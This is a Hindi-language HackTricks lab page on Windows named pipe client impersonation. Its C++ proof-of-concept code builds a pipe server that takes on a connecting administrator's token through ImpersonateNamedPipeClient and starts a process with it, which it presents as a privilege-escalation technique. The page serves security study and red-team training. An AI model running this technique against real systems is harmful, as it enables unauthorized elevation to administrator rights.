# नामित पाइप क्लाइंट इम्पर्सनेशन

## नामित पाइप क्लाइंट इम्पर्सनेशन

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) में या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें.

</details>

**यह जानकारी** [**https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation**](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation) **से कॉपी की गई थी**

## अवलोकन

`pipe` एक ब्लॉक होता है जिसे प्रोसेसेस संचार और डेटा एक्सचेंज के लिए उपयोग कर सकते हैं।

`Named Pipes` एक Windows मैकेनिज्म है जो दो असंबंधित प्रोसेसेस को आपस में डेटा एक्सचेंज करने की अनुमति देता है, भले ही प्रोसेसेस दो अलग-अलग नेटवर्क्स पर स्थित हों। यह क्लाइंट/सर्वर आर्किटेक्चर के समान होता है क्योंकि `a named pipe server` और एक `pipe client` की अवधारणाएँ मौजूद होती हैं।

एक नामित पाइप सर्वर किसी पूर्वनिर्धारित नाम के साथ एक नामित पाइप खोल सकता है और फिर एक नामित पाइप क्लाइंट उस पाइप से ज्ञात नाम के माध्यम से जुड़ सकता है। एक बार कनेक्शन स्थापित हो जाने के बाद, डेटा एक्सचेंज शुरू हो सकता है।

यह लैब एक सरल PoC कोड से संबंधित है जो अनुमति देता है:

* एक सिंगल-थ्रेडेड डम्ब नामित पाइप सर्वर बनाना जो एक क्लाइंट कनेक्शन को स्वीकार करेगा
* नामित पाइप सर्वर द्वारा नामित पाइप में एक सरल संदेश लिखना ताकि पाइप क्लाइंट इसे पढ़ सके

## कोड

नीचे सर्वर और क्लाइंट दोनों के लिए PoC दिया गया है:

{% tabs %}
{% tab title="namedPipeServer.cpp" %}
```cpp
#include "pch.h"
#include <Windows.h>
#include <iostream>

int main() {
LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
LPVOID pipeBuffer = NULL;
HANDLE serverPipe;
DWORD readBytes = 0;
DWORD readBuffer = 0;
int err = 0;
BOOL isPipeConnected;
BOOL isPipeOpen;
wchar_t message[] = L"HELL";
DWORD messageLenght = lstrlen(message) * 2;
DWORD bytesWritten = 0;

std::wcout << "Creating named pipe " << pipeName << std::endl;
serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);

isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
if (isPipeConnected) {
std::wcout << "Incoming connection to " << pipeName << std::endl;
}

std::wcout << "Sending message: " << message << std::endl;
WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);

return 0;
}
```
{% endtab %}

{% tab title="namedPipeClient.cpp" %}
```cpp
#include "pch.h"
#include <iostream>
#include <Windows.h>

const int MESSAGE_SIZE = 512;

int main()
{
LPCWSTR pipeName = L"\\\\10.0.0.7\\pipe\\mantvydas-first-pipe";
HANDLE clientPipe = NULL;
BOOL isPipeRead = true;
wchar_t message[MESSAGE_SIZE] = { 0 };
DWORD bytesRead = 0;

std::wcout << "Connecting to " << pipeName << std::endl;
clientPipe = CreateFile(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

while (isPipeRead) {
isPipeRead = ReadFile(clientPipe, &message, MESSAGE_SIZE, &bytesRead, NULL);
std::wcout << "Received message: " << message;
}

return 0;
}
```
{% endtab %}
{% endtabs %}

## Execution

नीचे दिखाया गया है कि named pipe server और named pipe client अपेक्षित रूप से कैसे काम कर रहे हैं:

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22.png>)

यह ध्यान देने योग्य है कि named pipes संचार मूल रूप से SMB प्रोटोकॉल का उपयोग करता है:

![](<../../.gitbook/assets/Screenshot from 2019-04-04 23-51-48.png>)

जांच रहे हैं कि कैसे प्रक्रिया हमारे named pipe `mantvydas-first-pipe` के लिए एक हैंडल बनाए रखती है:

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (1).png>)

इसी तरह, हम देख सकते हैं कि क्लाइंट के पास named pipe के लिए एक खुला हैंडल है:

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (2).png>)

हम powershell के साथ हमारे pipe को भी देख सकते हैं:
```csharp
((Get-ChildItem \\.\pipe\).name)[-1..-5]
```
```markdown
## टोकन इम्पर्सनेशन

{% hint style="info" %}
ध्यान दें कि क्लाइंट प्रोसेस के टोकन का इम्पर्सनेट करने के लिए आपको (नेम्ड पाइप बनाने वाले सर्वर प्रोसेस के पास) **`SeImpersonate`** टोकन प्रिविलेज की आवश्यकता होती है
{% endhint %}

नेम्ड पाइप सर्वर के लिए नेम्ड पाइप क्लाइंट के सिक्योरिटी कॉन्टेक्स्ट को इम्पर्सनेट करना संभव है, जिसके लिए `ImpersonateNamedPipeClient` API कॉल का उपयोग किया जाता है, जो बदले में नेम्ड पाइप सर्वर के वर्तमान थ्रेड के टोकन को नेम्ड पाइप क्लाइंट के टोकन से बदल देता है।

हम इम्पर्सनेशन प्राप्त करने के लिए नेम्ड पाइप सर्वर के कोड को इस तरह अपडेट कर सकते हैं - ध्यान दें कि परिवर्तन लाइन 25 और नीचे में देखे जा सकते हैं:
```
```cpp
int main() {
LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
LPVOID pipeBuffer = NULL;
HANDLE serverPipe;
DWORD readBytes = 0;
DWORD readBuffer = 0;
int err = 0;
BOOL isPipeConnected;
BOOL isPipeOpen;
wchar_t message[] = L"HELL";
DWORD messageLenght = lstrlen(message) * 2;
DWORD bytesWritten = 0;

std::wcout << "Creating named pipe " << pipeName << std::endl;
serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);

isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
if (isPipeConnected) {
std::wcout << "Incoming connection to " << pipeName << std::endl;
}

std::wcout << "Sending message: " << message << std::endl;
WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);

std::wcout << "Impersonating the client..." << std::endl;
ImpersonateNamedPipeClient(serverPipe);
err = GetLastError();

STARTUPINFO	si = {};
wchar_t command[] = L"C:\\Windows\\system32\\notepad.exe";
PROCESS_INFORMATION pi = {};
HANDLE threadToken = GetCurrentThreadToken();
CreateProcessWithTokenW(threadToken, LOGON_WITH_PROFILE, command, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

return 0;
}
```
सर्वर चलाने और उससे क्लाइंट के साथ कनेक्ट करने पर, जो कि administrator@offense.local सुरक्षा संदर्भ के तहत चल रहा है, हम देख सकते हैं कि नामित सर्वर पाइप के मुख्य धागे ने नामित पाइप क्लाइंट का टोकन मान लिया है - offense\administrator, हालांकि PipeServer.exe स्वयं ws01\mantvydas सुरक्षा संदर्भ के तहत चल रहा है। क्या यह विशेषाधिकार बढ़ाने का अच्छा तरीका लगता है?

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) के साथ AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग प्राप्त करें**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) **का अनुसरण करें**।
* [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>
